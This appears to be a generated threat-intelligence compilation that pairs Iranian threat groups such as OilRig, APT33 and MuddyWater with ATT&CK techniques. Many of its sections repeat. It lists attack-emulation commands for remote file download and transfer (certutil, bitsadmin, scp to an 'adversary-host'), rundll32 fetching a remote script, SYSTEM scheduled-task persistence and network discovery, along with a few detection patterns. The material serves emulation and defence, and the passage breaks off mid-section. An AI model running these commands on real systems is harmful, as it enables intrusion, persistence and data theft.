[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Remote File Copy

## Technique Description

```
Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as [FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.

Adversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076).
```

## Technique Commands

```
rsync -r #{local_path} victim@#{remote_host}:#{remote_path}
rsync -r /tmp/adversary-rsync/ victim@#{remote_host}:#{remote_path}
rsync -r #{local_path} #{username}@victim-host:#{remote_path}
rsync -r #{local_path} #{username}@victim-host:/tmp/victim-files
rsync -r adversary@#{remote_host}:#{remote_path} #{local_path}
rsync -r adversary@#{remote_host}:#{remote_path} /tmp/victim-files
rsync -r #{username}@adversary-host:#{remote_path} #{local_path}
rsync -r #{username}@adversary-host:/tmp/adversary-rsync/ #{local_path}
scp #{local_file} victim@#{remote_host}:#{remote_path}
scp /tmp/adversary-scp victim@#{remote_host}:#{remote_path}
scp #{local_file} #{username}@victim-host:#{remote_path}
scp #{local_file} #{username}@victim-host:/tmp/victim-files/
scp adversary@#{remote_host}:#{remote_file} #{local_path}
scp adversary@#{remote_host}:/tmp/adversary-scp #{local_path}
scp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
scp #{username}@adversary-host:#{remote_file} /tmp/victim-files/
sftp victim@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
sftp victim@#{remote_host}:#{remote_path} <<< $'put /tmp/adversary-sftp'
sftp #{username}@victim-host:#{remote_path} <<< $'put #{local_file}'
sftp #{username}@victim-host:/tmp/victim-files/ <<< $'put #{local_file}'
sftp adversary@#{remote_host}:#{remote_file} #{local_path}
sftp adversary@#{remote_host}:/tmp/adversary-sftp #{local_path}
sftp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
sftp #{username}@adversary-host:#{remote_file} /tmp/victim-files/
cmd /c certutil -urlcache -split -f #{remote_file} Atomic-license.txt
cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt
$datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f #{remote_file}
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
$datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} #{local_path}
C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} Atomic-license.txt
C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}
(New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "Atomic-license.txt")
(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "Atomic-license.txt")
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Remote File Copy

## Technique Description

```
Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as [FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.

Adversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076).
```

## Technique Commands

```
rsync -r #{local_path} victim@#{remote_host}:#{remote_path}
rsync -r /tmp/adversary-rsync/ victim@#{remote_host}:#{remote_path}
rsync -r #{local_path} #{username}@victim-host:#{remote_path}
rsync -r #{local_path} #{username}@victim-host:/tmp/victim-files
rsync -r adversary@#{remote_host}:#{remote_path} #{local_path}
rsync -r adversary@#{remote_host}:#{remote_path} /tmp/victim-files
rsync -r #{username}@adversary-host:#{remote_path} #{local_path}
rsync -r #{username}@adversary-host:/tmp/adversary-rsync/ #{local_path}
scp #{local_file} victim@#{remote_host}:#{remote_path}
scp /tmp/adversary-scp victim@#{remote_host}:#{remote_path}
scp #{local_file} #{username}@victim-host:#{remote_path}
scp #{local_file} #{username}@victim-host:/tmp/victim-files/
scp adversary@#{remote_host}:#{remote_file} #{local_path}
scp adversary@#{remote_host}:/tmp/adversary-scp #{local_path}
scp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
scp #{username}@adversary-host:#{remote_file} /tmp/victim-files/
sftp victim@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
sftp victim@#{remote_host}:#{remote_path} <<< $'put /tmp/adversary-sftp'
sftp #{username}@victim-host:#{remote_path} <<< $'put #{local_file}'
sftp #{username}@victim-host:/tmp/victim-files/ <<< $'put #{local_file}'
sftp adversary@#{remote_host}:#{remote_file} #{local_path}
sftp adversary@#{remote_host}:/tmp/adversary-sftp #{local_path}
sftp #{username}@#{remote_host}:#{remote_file} /tmp/victim-files/
sftp #{username}@adversary-host:#{remote_file} /tmp/victim-files/
cmd /c certutil -urlcache -split -f #{remote_file} Atomic-license.txt
cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt
$datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f #{remote_file}
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
$datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} #{local_path}
C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH #{remote_file} Atomic-license.txt
C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt #{local_path}
(New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "Atomic-license.txt")
(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "Atomic-license.txt")
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Remote Services

## Technique Description

```
An adversary may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.
```

## Technique Commands

```
python/lateral_movement/multi/ssh_command
python/lateral_movement/multi/ssh_command
python/lateral_movement/multi/ssh_launcher
python/lateral_movement/multi/ssh_launcher
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: Remote Services

## Technique Description

```
An adversary may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.
```

## Technique Commands

```
python/lateral_movement/multi/ssh_command
python/lateral_movement/multi/ssh_command
python/lateral_movement/multi/ssh_launcher
python/lateral_movement/multi/ssh_launcher
```



# Actor: Leafminer

## Actor Description

```
[Leafminer](https://attack.mitre.org/groups/G0077) is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. (Citation: Symantec Leafminer July 2018)
```

## Actor Aliases

```
Leafminer
Raspite
```

## Technique Name: Remote System Discovery

## Technique Description

```
Adversaries will likely attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used. Adversaries may also use local host files in order to discover the hostname to IP address mappings of remote systems. 

### Windows

Examples of tools and commands that acquire this information include "ping" or "net view" using [Net](https://attack.mitre.org/software/S0039). The contents of the <code>C:\Windows\System32\Drivers\etc\hosts</code> file can be viewed to gain insight into the existing hostname to IP mappings on the system.

### Mac

Specific to Mac, the <code>bonjour</code> protocol to discover additional Mac-based systems within the same broadcast domain. Utilities such as "ping" and others can be used to gather information about remote systems. The contents of the <code>/etc/hosts</code> file can be viewed to gain insight into existing hostname to IP mappings on the system.

### Linux

Utilities such as "ping" and others can be used to gather information about remote systems. The contents of the <code>/etc/hosts</code> file can be viewed to gain insight into existing hostname to IP mappings on the system.

### Cloud

In cloud environments, the above techniques may be used to discover remote systems depending upon the host operating system. In addition, cloud environments often provide APIs with information about remote systems and services.

```

## Technique Commands

```
net group "Domain Computers" /domain[:DOMAIN]
net group "Domain Computers" /domain
post/windows/gather/enum_ad_computers
post/windows/gather/enum_computers
net group "Domain Controllers" /domain[:DOMAIN]
net group "Domain Controllers" /domain
nltest /dclist[:domain]
echo %LOGONSERVER%
shell echo %LOGONSERVER%
net view /domain
net view
net group "Domain Computers" /domain
nltest.exe /dclist:domain.local
for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i
arp -a
arp -a | grep -v '^?'
for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo "192.168.1.$ip UP" || : ; done
$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
$pieces = $localip.split(".")
$firstOctet = $pieces[0]
$secondOctet = $pieces[1]
$thirdOctet = $pieces[2]
foreach ($ip in 1..255 | % { "$firstOctet.$secondOctet.$thirdOctet.$_" } ) {cmd.exe /c nslookup $ip}
net.exe view /domain
qwinsta.exe /server:
installutil.exe /logfile= /LogToConsole=false /U *.dll
powershell/situational_awareness/network/powerview/get_domain_controller
powershell/situational_awareness/network/powerview/get_domain_controller
powershell/situational_awareness/network/powerview/get_domain_policy
powershell/situational_awareness/network/powerview/get_domain_policy
powershell/situational_awareness/network/powerview/get_domain_trust
powershell/situational_awareness/network/powerview/get_domain_trust
powershell/situational_awareness/network/powerview/get_forest
powershell/situational_awareness/network/powerview/get_forest
powershell/situational_awareness/network/powerview/get_forest_domain
powershell/situational_awareness/network/powerview/get_forest_domain
powershell/situational_awareness/network/powerview/get_site
powershell/situational_awareness/network/powerview/get_site
powershell/situational_awareness/network/reverse_dns
powershell/situational_awareness/network/reverse_dns
python/situational_awareness/network/active_directory/get_computers
python/situational_awareness/network/active_directory/get_computers
python/situational_awareness/network/active_directory/get_domaincontrollers
python/situational_awareness/network/active_directory/get_domaincontrollers
python/situational_awareness/network/gethostbyname
python/situational_awareness/network/gethostbyname
Bash
C: \ Users \ administrator.0DAY> net view \\ ICBC.0day.org
List is empty.
```



# Actor: CopyKittens

## Actor Description

```
[CopyKittens](https://attack.mitre.org/groups/G0052) is an Iranian cyber espionage group that has been operating since at least 2013. It has targeted countries including Israel, Saudi Arabia, Turkey, the U.S., Jordan, and Germany. The group is responsible for the campaign known as Operation Wilted Tulip. (Citation: ClearSky CopyKittens March 2017) (Citation: ClearSky Wilted Tulip July 2017) (Citation: CopyKittens Nov 2015)
```

## Actor Aliases

```
CopyKittens
```

## Technique Name: Rundll32

## Technique Description

```
The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.

Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)
```

## Technique Commands

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct").Exec();
rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
rundll32.exe advpack.dll,LaunchINFSection PathToAtomicsFolder\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,
rundll32.exe ieadvpack.dll,LaunchINFSection PathToAtomicsFolder\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,
rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
vbscript|javascript|http|https|.dll\\Windows\\.+\\rundll32.exe
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Rundll32

## Technique Description

```
The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.

Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)
```

## Technique Commands

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct").Exec();
rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)
rundll32.exe advpack.dll,LaunchINFSection PathToAtomicsFolder\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,
rundll32.exe ieadvpack.dll,LaunchINFSection PathToAtomicsFolder\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,
rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
vbscript|javascript|http|https|.dll\\Windows\\.+\\rundll32.exe
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Scheduled Task

## Technique Description

```
Utilities such as [at](https://attack.mitre.org/software/S0110) and [schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the remote system. (Citation: TechNet Task Scheduler Security)

An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.
```

## Technique Commands

```
schtasks [/s HOSTNAME]
shell schtasks
Creating a scheduled task:
schtasks [/S HOSTNAME] /create /tn "acachesrv" /tr C:\file\path\here.exe /sc ONLOGON /ru "System" [/rp password]
Requirements for running scheduled tasks:
net start schedule
sc config schedule start= auto
Creating a scheduled task:
shell schtasks [/S HOSTNAME] /create /tn "acachesrv" /tr C:\file\path\here.exe /sc ONLOGON /ru "System" [/rp password]
Requirements for running scheduled tasks:
shell net start schedule
shell sc config schedule start= auto
at 13:20 /interactive cmd
SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST #{time}
SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "C:\windows\system32\cmd.exe" /SC daily /ST #{time}
SCHTASKS /Create /S #{target} /RU #{user_name} /RP At0micStrong /TN "Atomic task" /TR "C:\windows\system32\cmd.exe" /SC daily /ST #{time}
SCHTASKS /Create /S #{target} /RU DOMAIN\user /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
SCHTASKS /Create /S localhost /RU DOMAIN\user /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
$Action = New-ScheduledTaskAction -Execute "calc.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTask -InputObject $object
schtask.exe /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
schtask.exe /create /tn "mysc" /tr C:\windows\system32\cmd.exe /sc ONLOGON /ru "System"
at.exe ##:## /interactive cmd
at.exe \\[computername|IP] ##:## c:\temp\evil.bat
net.exe use \\[computername|IP] /user:DOMAIN\username password
net.exe time \\[computername|IP]
schtasks.exe /create * appdata
\\Windows\\.+\\at.exe
/Create\\Windows\\.+\\schtasks.exe
powershell/lateral_movement/new_gpo_immediate_task
powershell/lateral_movement/new_gpo_immediate_task
powershell/persistence/elevated/schtasks
powershell/persistence/elevated/schtasks
powershell/persistence/userland/schtasks
powershell/persistence/userland/schtasks
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: Scheduled Task

## Technique Description

```
Utilities such as [at](https://attack.mitre.org/software/S0110) and [schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the remote system. (Citation: TechNet Task Scheduler Security)

An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.
```

## Technique Commands

```
schtasks [/s HOSTNAME]
shell schtasks
Creating a scheduled task:
schtasks [/S HOSTNAME] /create /tn "acachesrv" /tr C:\file\path\here.exe /sc ONLOGON /ru "System" [/rp password]
Requirements for running scheduled tasks:
net start schedule
sc config schedule start= auto
Creating a scheduled task:
shell schtasks [/S HOSTNAME] /create /tn "acachesrv" /tr C:\file\path\here.exe /sc ONLOGON /ru "System" [/rp password]
Requirements for running scheduled tasks:
shell net start schedule
shell sc config schedule start= auto
at 13:20 /interactive cmd
SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST #{time}
SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "C:\windows\system32\cmd.exe" /SC daily /ST #{time}
SCHTASKS /Create /S #{target} /RU #{user_name} /RP At0micStrong /TN "Atomic task" /TR "C:\windows\system32\cmd.exe" /SC daily /ST #{time}
SCHTASKS /Create /S #{target} /RU DOMAIN\user /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
SCHTASKS /Create /S localhost /RU DOMAIN\user /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
$Action = New-ScheduledTaskAction -Execute "calc.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTask -InputObject $object
schtask.exe /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
schtask.exe /create /tn "mysc" /tr C:\windows\system32\cmd.exe /sc ONLOGON /ru "System"
at.exe ##:## /interactive cmd
at.exe \\[computername|IP] ##:## c:\temp\evil.bat
net.exe use \\[computername|IP] /user:DOMAIN\username password
net.exe time \\[computername|IP]
schtasks.exe /create * appdata
\\Windows\\.+\\at.exe
/Create\\Windows\\.+\\schtasks.exe
powershell/lateral_movement/new_gpo_immediate_task
powershell/lateral_movement/new_gpo_immediate_task
powershell/persistence/elevated/schtasks
powershell/persistence/elevated/schtasks
powershell/persistence/userland/schtasks
powershell/persistence/userland/schtasks
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Scheduled Task

## Technique Description

```
Utilities such as [at](https://attack.mitre.org/software/S0110) and [schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the remote system. (Citation: TechNet Task Scheduler Security)

An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.
```

## Technique Commands

```
schtasks [/s HOSTNAME]
shell schtasks
Creating a scheduled task:
schtasks [/S HOSTNAME] /create /tn "acachesrv" /tr C:\file\path\here.exe /sc ONLOGON /ru "System" [/rp password]
Requirements for running scheduled tasks:
net start schedule
sc config schedule start= auto
Creating a scheduled task:
shell schtasks [/S HOSTNAME] /create /tn "acachesrv" /tr C:\file\path\here.exe /sc ONLOGON /ru "System" [/rp password]
Requirements for running scheduled tasks:
shell net start schedule
shell sc config schedule start= auto
at 13:20 /interactive cmd
SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST #{time}
SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "C:\windows\system32\cmd.exe" /SC daily /ST #{time}
SCHTASKS /Create /S #{target} /RU #{user_name} /RP At0micStrong /TN "Atomic task" /TR "C:\windows\system32\cmd.exe" /SC daily /ST #{time}
SCHTASKS /Create /S #{target} /RU DOMAIN\user /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
SCHTASKS /Create /S localhost /RU DOMAIN\user /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
$Action = New-ScheduledTaskAction -Execute "calc.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTask -InputObject $object
schtask.exe /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
schtask.exe /create /tn "mysc" /tr C:\windows\system32\cmd.exe /sc ONLOGON /ru "System"
at.exe ##:## /interactive cmd
at.exe \\[computername|IP] ##:## c:\temp\evil.bat
net.exe use \\[computername|IP] /user:DOMAIN\username password
net.exe time \\[computername|IP]
schtasks.exe /create * appdata
\\Windows\\.+\\at.exe
/Create\\Windows\\.+\\schtasks.exe
powershell/lateral_movement/new_gpo_immediate_task
powershell/lateral_movement/new_gpo_immediate_task
powershell/persistence/elevated/schtasks
powershell/persistence/elevated/schtasks
powershell/persistence/userland/schtasks
powershell/persistence/userland/schtasks
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Screen Capture

## Technique Description

```
Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.

### Mac

On OSX, the native command <code>screencapture</code> is used to capture screenshots.

### Linux

